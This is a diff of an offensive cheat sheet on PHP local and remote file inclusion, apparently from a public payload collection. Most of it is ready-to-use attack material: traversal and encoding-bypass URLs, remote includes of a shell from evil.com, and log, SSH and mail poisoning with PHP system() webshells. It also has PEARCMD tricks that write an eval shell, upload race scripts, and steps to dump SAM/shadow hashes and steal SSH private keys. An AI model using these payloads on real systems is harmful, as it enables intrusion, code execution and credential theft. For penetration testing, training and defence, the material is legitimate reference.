@@ -1,21 +1,21 @@
 # File Inclusion
 
-> The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application.
+> A File Inclusion Vulnerability refers to a type of security vulnerability in web applications, particularly prevalent in applications developed in PHP, where an attacker can include a file, usually exploiting a lack of proper input/output sanitization. This vulnerability can lead to a range of malicious activities, including code execution, data theft, and website defacement.
 
-> The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application
+**File Inclusion Vulnerability** should be differenciated from **Path Traversal**. The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a "reading" mechanism implemented in the target application, when the File Inclusion will lead to the execution of arbitrary code.
 
 ## Summary
 
 - [File Inclusion](#file-inclusion)
   - [Summary](#summary)
   - [Tools](#tools)
-  - [Basic LFI](#basic-lfi)
+  - [Local File Inclusion](#local-file-inclusion)
     - [Null byte](#null-byte)
     - [Double encoding](#double-encoding)
     - [UTF-8 encoding](#utf-8-encoding)
     - [Path and dot truncation](#path-and-dot-truncation)
     - [Filter bypass tricks](#filter-bypass-tricks)
-  - [Basic RFI](#basic-rfi)
+  - [Remote File Inclusion](#remote-file-inclusion)
     - [Null byte](#null-byte-1)
     - [Double encoding](#double-encoding-1)
     - [Bypass allow_url_include](#bypass-allow_url_include)
@@ -38,9 +38,8 @@
     - [RCE via Mail](#rce-via-mail)
     - [RCE via Apache logs](#rce-via-apache-logs)
   - [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
+  - [LFI to RCE via PHP PEARCMD](#lfi-to-rce-via-php-pearcmd)
   - [LFI to RCE via credentials files](#lfi-to-rce-via-credentials-files)
-    - [Windows version](#windows-version)
-    - [Linux version](#linux-version)
   - [References](#references)
 
 ## Tools
@@ -50,7 +49,17 @@
 * [fimap - https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)
 * [panoptic - https://github.com/lightos/Panoptic](https://github.com/lightos/Panoptic)
 
-## Basic LFI
+
+## Local File Inclusion
+
+Consider a PHP script that includes a file based on user input. If proper sanitization is not in place, an attacker could manipulate the `page` parameter to include local or remote files, leading to unauthorized access or code execution.
+
+```php
+<?php
+$file = $_GET['page'];
+include($file);
+?>
+```
 
 In the following examples we include the `/etc/passwd` file, check the `Directory & Path Traversal` chapter for more interesting files.
 
@@ -82,7 +91,7 @@ http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/pas
 
 ### Path and dot truncation
 
-On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.
+On most PHP installations a filename longer than `4096` bytes will be cut off so any excess chars will be thrown away.
 
 ```powershell
 http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
@@ -99,7 +108,17 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
-## Basic RFI
+
+## Remote File Inclusion
+
+> Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.
+
+Remote File Inclusion doesn't work anymore on a default configuration since `allow_url_include` is now disabled since PHP5.
+
+```ini
+allow_url_include = On
+```
+
 
 Most of the filter bypasses from LFI section can be reused for RFI.
 
@@ -113,11 +132,13 @@ http://example.com/index.php?page=http://evil.com/shell.txt
 http://example.com/index.php?page=http://evil.com/shell.txt%00
 ```
 
+
 ### Double encoding
 
 ```powershell
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
+
 
 ### Bypass allow_url_include
 
@@ -287,6 +308,7 @@ $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/tes
 1. Upload a lot of shells (for example : 100)
 2. Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)
 
+
 ## LFI to RCE via /proc/self/environ
 
 Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file
@@ -309,9 +331,9 @@ In order to keep the file readable it is best to inject into the metadata for th
 
 
 ## LFI to RCE via upload (race)
-Worlds Quitest Let's Play"
+
 * Upload a file and trigger a self-inclusion.
-* Repeat 1 a shitload of time to:
+* Repeat the upload a shitload of time to:
 * increase our odds of winning the race
 * increase our guessing odds
 * Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
@@ -339,14 +361,18 @@ for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
 print('[x] Something went wrong, please try again')
 ```
 
+
 ## LFI to RCE via upload (FindFirstFile)
 
 :warning: Only works on Windows
 
-`FindFirstFile` allows using masks (`<<` as `*` and `>` as `?`) in LFI paths on Windows. 
+`FindFirstFile` allows using masks (`<<` as `*` and `>` as `?`) in LFI paths on Windows. A mask is essentially a search pattern that can include wildcard characters, allowing users or developers to search for files or directories based on partial names or types. In the context of FindFirstFile, masks are used to filter and match the names of files or directories.
 
-* Upload a file, it should be stored in the temp folder `C:\Windows\Temp\`.
-* Include it using `http://site/vuln.php?inc=c:\windows\temp\php<<`
+* `*`/`<<` : Represents any sequence of characters.
+* `?`/`>` : Represents any single character.
+
+Upload a file, it should be stored in the temp folder `C:\Windows\Temp\` with a generated name like `php[A-F0-9]{4}.tmp`.
+Then either bruteforce the 65536 filenames or use a wildcard character like: `http://site/vuln.php?inc=c:\windows\temp\php<<`
 
 
 ## LFI to RCE via phpinfo()
@@ -355,9 +381,10 @@ PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** an
 
 > By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.
 
-Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
+Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
 
 Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
+
 
 ## LFI to RCE via controlled log file
 
@@ -378,6 +405,7 @@ http://example.com/index.php?page=/usr/local/apache/log/error_log
 http://example.com/index.php?page=/usr/local/apache2/log/error_log
 ```
 
+
 ### RCE via SSH
 
 Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.
@@ -391,6 +419,7 @@ Then include the SSH log files inside the Web Application.
 ```powershell
 http://example.com/index.php?page=/var/log/auth.log&cmd=id
 ```
+
 
 ### RCE via Mail
 
@@ -421,6 +450,7 @@ In some cases you can also send the email with the `mail` command line.
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
 
+
 ### RCE via Apache logs
 
 Poison the User-Agent in access logs:
@@ -436,6 +466,7 @@ Then request the logs via the LFI and execute your command.
 ```
 $ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ```
+
 
 ## LFI to RCE via PHP sessions
 
@@ -465,9 +496,35 @@ Use the LFI to include the PHP session file
 login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
 ```
 
+
+## LFI to RCE via PHP PEARCMD
+
+PEAR is a framework and distribution system for reusable PHP components. By default `pearcmd.php` is installed in every Docker PHP image from [hub.docker.com](https://hub.docker.com/_/php) in `/usr/local/lib/php/pearcmd.php`. 
+
+The file `pearcmd.php` uses `$_SERVER['argv']` to get its arguments. The directive `register_argc_argv` must be set to `On` in PHP configuration (`php.ini`) for this attack to work.
+
+```ini
+register_argc_argv = On
+```
+
+There are two ways to exploit it.
+
+* Method 1: config create
+  ```ps1
+  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
+  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
+  ```
+* Method 2: man_dir
+  ```ps1
+  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+"
+  /vuln.php?file=/tmp/exec.php&c=id
+  ```
+
+
 ## LFI to RCE via credentials files
 
 This method require high privileges inside the application in order to read the sensitive files.
+
 
 ### Windows version
 
@@ -479,6 +536,7 @@ http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
 ```
 
 Then extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay them using the Pass The Hash technique.
+
 
 ### Linux version
 
@@ -492,6 +550,7 @@ Then crack the hashes inside in order to login via SSH on the machine.
 
 Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa.
 If SSH is active check which user is being used `/proc/self/status` and `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa`.
+
 
 ## References
 
